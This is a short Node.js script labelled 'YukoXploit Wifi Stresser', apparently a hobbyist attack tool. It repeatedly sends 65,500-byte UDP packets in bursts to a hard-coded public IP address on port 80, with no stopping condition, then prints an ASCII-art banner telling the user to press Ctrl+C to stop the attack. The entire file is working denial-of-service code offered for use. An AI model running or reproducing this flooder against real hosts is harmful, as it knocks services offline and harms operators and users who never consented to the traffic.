const dgram = require('dgram');

const target = '108.177.96.113';
const port = 80;

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('A');
    return payload;
}

const payload = generatePayload(65500);

setInterval(() => {
    const socket = dgram.createSocket('udp4');
    for (let p = 0; p < 50; p++) {
        socket.send(payload, 0, payload.length, port, target);
    }
    socket.send(payload, 0, payload.length, port, target, (err) => {
        if (err) {
            console.error('Error sending message:', err);
        }
        socket.close();
    });
});

console.clear();

console.log("\x1b[36m%s\x1b[0m", `
              ⣀⣀⣤⣤⣤⣤⡤⣀⡀⣀⣀⡀⡀   ⢲⣤⣤⣤⣤⣀⣀⡀            
         ⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷  ⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀        
      ⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁  ⠠⣿⣿⡟⢻⣿⣿⣇     ⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀      
     ⣠⣿⡾⣿⣿⣿⣿⠿⣻⣿⣿⣿⡀   ⢻⣿⣷⡀⠻⣧⣿⠆    ⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀    
    ⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧   ⠈⠿⣿⣿⣷⣈⠁    ⣰⣿⣿⣿⣷⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄   
  ⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄ ⣰⣿⣿⣿⣿⣿⣷⣄ ⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄  
 ⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆ 
 ⢯⣿⠏⣠⠞⠋ ⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟ ⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦ ⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋  ⠼⠋ ⠸⡇⠻ ⠈⠃ ⣧⢋⣼⣿⣿⣿⣷⣆ ⠈⠁ ⠟⠁⡟ ⠈⠻  ⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁               ⠙⠻⠿⠿⠿⠋ ⢻⣿⡄               ⠈⠙⢾⣆⠈⣷
⡟ ⡿⠁                   ⣴⣶⣤⡀⢸⣿⠇                  ⢻⡄⢹
⡇ ⠃                   ⠈⠻⠶⣶⡟⠋                     ⡼
⠈                      ⢀⡾⠋                       ⠁
                       ⢀⣿⣿⣀⣀⣀               
`);

console.log(`
\x1b[36mYukoXploit Wifi Stresser\x1b[0m
=======================================================================
Ctrl + C To Stop The Attack
`);